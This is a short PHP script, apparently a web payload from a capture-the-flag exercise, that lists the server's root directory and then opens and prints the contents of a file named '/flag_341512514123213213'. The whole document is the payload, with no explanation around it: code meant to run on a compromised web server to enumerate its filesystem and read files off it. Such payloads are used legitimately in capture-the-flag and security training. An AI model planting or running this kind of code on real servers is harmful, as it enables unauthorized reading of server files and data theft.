<?php
print_r(scandir("/"));
$filename = '/flag_341512514123213213';
$f = fopen($filename, 'r');

if ($f) {
    $contents = fread($f, filesize($filename));
    fclose($f);
    echo nl2br($contents);
}
?>
